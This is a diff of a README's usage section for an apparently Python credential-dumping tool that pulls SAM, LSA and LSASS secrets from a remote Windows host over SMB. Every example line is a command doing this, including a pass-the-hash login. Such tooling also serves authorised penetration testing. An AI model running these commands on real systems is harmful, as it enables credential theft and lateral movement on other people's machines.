@@ -95,19 +95,14 @@ Dependencies: `smbprotocol` + `pycryptodome` only.
 ## Usage
 
 ```bash
-# Everything (SAM + LSA + LSASS) — default when no flags
-python main.py -t 10.0.0.5 -u admin -p 'P@ssw0rd'
-
 # Pick what you need
+python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
 python main.py -t 10.0.0.5 -u admin -p pass --sam
 python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa
-python main.py -t 10.0.0.5 -u admin -p pass --lsass -o lsass.dmp
+python main.py -t 10.0.0.5 -u admin -p pass --lsass
 
 # Pass-the-Hash
 python main.py -t 10.0.0.5 -u admin -H aad3b435b51404eeaad3b435b51404ee --sam
-
-# Parse existing dump offline
-python main.py --parse lsass.dmp
 ```
 
 ## Agent internals
